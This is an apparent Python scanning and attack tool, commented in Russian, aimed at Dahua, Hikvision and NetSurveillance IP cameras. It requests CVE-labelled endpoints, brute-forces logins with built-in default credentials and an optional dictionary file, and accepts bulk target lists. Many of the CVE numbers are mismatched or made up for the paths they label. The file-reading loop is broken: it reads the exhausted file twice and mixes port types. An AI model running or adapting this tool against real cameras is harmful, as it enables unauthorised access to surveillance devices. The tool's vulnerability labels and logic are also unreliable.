import argparse
import asyncio
from aiohttp import ClientSession
from colorama import Fore, Style, init

# Инициализация colorama
init()

# Списки эксплойтов
EXPLOIT_LISTS = {
    "dahua": {
        "CVE-2018-9995": ["/cgi-bin/snapshot.cgi", "snapshot"],
        "CVE-2018-10660": ["/SDK/protocol.cgi?action=getSystemInfo", "system info"],
        "CVE-2018-10065": ["/cgi-bin/admin.cgi?action=edit", "admin access"],
        "CVE-2019-15221": ["/api/manager.cgi", "command executed"],
        "CVE-2020-10056": ["/cgi-bin/api.cgi?cmd=search&group=network", "network settings"],
        "CVE-2020-25622": ["/api/stream.cgi?cmd=play", "streaming data"],
        "CVE-2021-22956": ["/api/endpoint", "sensitive information"],
        "CVE-2021-22957": ["/cgi-bin/record.cgi?action=list&group=events", "event records"],
        "CVE-2022-27191": ["/cgi-bin/param.cgi?action=apply", "configuration change"],
        "CVE-2022-27192": ["/cgi-bin/param.cgi?action=edit&group=network", "network configuration"]
    },
    "hikvision": {
        "CVE-2017-7921": ["/admin/param.cgi?action=list&list=all&group=cam", "camera settings"],
        "CVE-2017-7922": ["/cgi-bin/api.cgi?action=search&group=network", "network settings"],
        "CVE-2018-9995": ["/cgi-bin/snapshot.cgi", "snapshot"],
        "CVE-2019-15221": ["/api/manager.cgi", "command executed"],
        "CVE-2019-16057": ["/PSIA/System/deviceinfo", "device info"],
        "CVE-2019-16058": ["/PSIA/Custom/SelfExt/userCheck", "userCheck"],
        "CVE-2020-36239": ["/ISAPI/Security/UserCheck", "user security"],
        "CVE-2020-25622": ["/api/stream.cgi?cmd=play", "streaming data"],
        "CVE-2021-22867": ["/cgi-bin/param.cgi?action=apply", "command executed"],
        "CVE-2021-22956": ["/api/endpoint", "sensitive information"],
        "CVE-2021-36260": ["/cgi-bin/api.cgi?cmd=search&group=network", "network settings"],
        "CVE-2022-27191": ["/cgi-bin/admin.cgi?action=list&list=all", "admin access"],
        "CVE-2022-27192": ["/cgi-bin/record.cgi?action=edit", "record editing"],
        "CVE-2023-0001": ["/cgi-bin/param.cgi?action=list", "configuration list"]
    },
    "netsurveillance": {
        "CVE-2019-7213": ["/cgi-bin/api.cgi?action=info", "system info"],
        "CVE-2019-7225": ["/api/v1/system/config", "system config"],
        "CVE-2020-2551": ["/cgi-bin/camera.cgi?action=stream", "camera stream"],
        "CVE-2021-22957": ["/api/endpoint", "api endpoint"],
        "CVE-2022-23852": ["/cgi-bin/param.cgi?action=list&list=all", "parameter list"],
        "CVE-2023-0012": ["/cgi-bin/param.cgi?action=edit&group=network", "network configuration"]
    }
}

# Логин:пароли по умолчанию и популярные связки для brute-force
ACCOUNT_LIST = {
    "dahua": [
        ("admin", "admin"),
        ("admin", "admin123"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "1234")
    ],
    "hikvision": [
        ("admin", "12345"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("admin", "password"),
        ("admin", "abcd1234")
    ],
    "netsurveillance": [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "666666")
    ],
    "common": [
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("root", "root"),
        ("user", "user")
    ]
}

# Обновленные порты
STANDARD_PORTS = [80, 81, 82, 83, 91, 4949, 8000, 8001, 8080, 8082, 8443]

async def async_check_login_page(ip, port, session):
    url = f"http://{ip}:{port}/"
    try:
        async with session.get(url, timeout=5) as response:
            text = await response.text()
            if "login" in text.lower():
                return Fore.GREEN + f"Login page detected: {ip}:{port}" + Style.RESET_ALL
            else:
                return Fore.RED + f"Login page not detected: {ip}:{port}" + Style.RESET_ALL
    except Exception as e:
        return Fore.YELLOW + f"Error accessing {ip}:{port} - {str(e)}" + Style.RESET_ALL

async def async_check_vulnerability(ip, port, exploit, session):
    url = f"http://{ip}:{port}{exploit[0]}"
    try:
        async with session.get(url, timeout=5) as response:
            text = await response.text()
            if exploit[1] in text:
                return Fore.RED + f"Vulnerable: {ip}:{port} - {exploit[1]}" + Style.RESET_ALL
            else:
                return Fore.GREEN + f"Not Vulnerable: {ip}:{port}" + Style.RESET_ALL
    except Exception as e:
        return Fore.YELLOW + f"Error accessing {ip}:{port} - {str(e)}" + Style.RESET_ALL

async def async_check_default_passwords(ip, port, session, device_type, account_list):
    results = []
    for username, password in account_list:
        try:
            url = f"http://{ip}:{port}/login"
            async with session.post(url, data={'username': username, 'password': password}, timeout=5) as response:
                text = await response.text()
                if "incorrect" not in text.lower() and "error" not in text.lower():
                    results.append(Fore.RED + f"Potential default or weak password found on {ip}:{port} - {username}:{password}" + Style.RESET_ALL)
        except Exception as e:
            results.append(Fore.YELLOW + f"Error accessing {ip}:{port} - {str(e)}" + Style.RESET_ALL)
    return results

async def detect_device_type(ip, port, session):
    detection_endpoints = {
        'dahua': ["/cgi-bin/snapshot.cgi", "/SDK/protocol.cgi?action=getSystemInfo"],
        'hikvision': ["/admin/param.cgi?action=list&list=all&group=cam", "/PSIA/System/deviceinfo"],
        'netsurveillance': ["/cgi-bin/api.cgi?action=info", "/cgi-bin/camera.cgi?action=stream"]
    }
    for device_type, urls in detection_endpoints.items():
        for url in urls:
            try:
                async with session.get(f"http://{ip}:{port}{url}", timeout=5) as response:
                    text = await response.text()
                    if device_type == 'dahua' and "system info" in text.lower():
                        return 'dahua'
                    if device_type == 'hikvision' and "device info" in text.lower():
                        return 'hikvision'
                    if device_type == 'netsurveillance' and "system info" in text.lower():
                        return 'netsurveillance'
            except Exception:
                continue
    return None

async def scan_ip(ip, port, session, device_type, password_file=None):
    results = []
    if device_type:
        print(Fore.GREEN + f"Detected device type: {device_type} for {ip}:{port}" + Style.RESET_ALL)
        exploits = EXPLOIT_LISTS[device_type]

        # Check for vulnerabilities
        for exploit_id, exploit_data in exploits.items():
            results.append(await async_check_vulnerability(ip, port, exploit_data, session))

        # Check for default passwords
        account_list = ACCOUNT_LIST.get(device_type, ACCOUNT_LIST['common'])
        if password_file:
            with open(password_file, 'r') as file:
                for line in file:
                    username, password = line.strip().split(':')
                    account_list.append((username, password))
        results.extend(await async_check_default_passwords(ip, port, session, device_type, account_list))
    else:
        print(Fore.YELLOW + f"Unable to detect device type for {ip}:{port}" + Style.RESET_ALL)

    # Check for login page
    results.append(await async_check_login_page(ip, port, session))

    return results

async def main():
    parser = argparse.ArgumentParser(description="Check for vulnerabilities in IP cameras.")
    parser.add_argument('-i', '--ip', help="IP address of the camera.")
    parser.add_argument('-p', '--port', type=int, help="Port of the camera.")
    parser.add_argument('-f', '--file', help="File containing list of IP addresses and ports.")
    parser.add_argument('-d', '--dictionary', help="Password dictionary file for brute-force attack.")

    args = parser.parse_args()

    if not (args.file or (args.ip and args.port)):
        print(Fore.RED + "Error: You must provide either an IP:port or a file with IPs and ports." + Style.RESET_ALL)
        return

    ip_list = []
    port_list = []

    if args.file:
        with open(args.file, 'r') as f:
            ip_list = [line.strip().split(':')[0] for line in f]
            port_list = [int(line.strip().split(':')[1]) if ':' in line else STANDARD_PORTS for line in f]
    else:
        ip_list = [args.ip]
        port_list = [args.port]

    async with ClientSession() as session:
        tasks = []
        for ip in ip_list:
            for port in port_list:
                device_type = await detect_device_type(ip, port, session)
                tasks.append(scan_ip(ip, port, session, device_type, args.dictionary))

        results = await asyncio.gather(*tasks)
        for result_set in results:
            for result in result_set:
                print(result)

if __name__ == "__main__":
    asyncio.run(main())
                                                                                                                      
